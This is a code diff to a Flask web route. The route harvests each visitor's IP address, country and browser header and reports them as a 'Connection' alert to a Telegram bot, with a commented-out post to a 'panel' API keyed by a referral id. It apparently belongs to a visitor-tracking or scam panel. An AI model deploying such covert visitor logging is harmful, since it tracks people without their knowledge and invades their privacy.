@@ -27,6 +27,7 @@ def index():
 
         country = request.headers.get('Cf-Ipcountry')
         OSName = request.headers['Sec-Ch-Ua'].split(',')[2].strip()
+        browser = OSName.replace('"', '').replace(';', '').split('=')
 
         refId = request.args.get('ref')
         url = f'https://panel-1rn0.onrender.com/api/connection/send/{refId}'
@@ -35,12 +36,12 @@ def index():
             'IP': real_ip,
             'country': country,
             'device': 'Windows 10',
-            'OSName': 'Firefox'
+            'browser': browser
         }
         
         # res = requests.post(url, json=data, proxies=None)
     
-        message = f'🔗 Connection: {real_ip}\n\nCountry: {country}\n\nBrowser: {OSName}'
+        message = f'🔗 Connection: {real_ip}\n\nCountry: {country}\n\nBrowser: {browser}'
 
         requests.post(
             f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
